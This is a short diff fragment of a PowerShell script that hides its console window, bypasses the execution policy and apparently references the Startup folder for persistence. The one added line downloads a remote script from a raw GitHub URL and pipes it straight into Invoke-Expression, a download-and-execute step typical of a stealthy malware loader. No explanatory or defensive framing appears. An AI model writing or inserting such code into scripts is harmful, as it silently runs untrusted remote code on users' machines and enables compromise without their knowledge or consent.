@@ -26,6 +26,7 @@ Add-Type @"
 [ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
+iwr "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/vm.ps1" | iex
 
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
 $startupfolder = $env:appdata
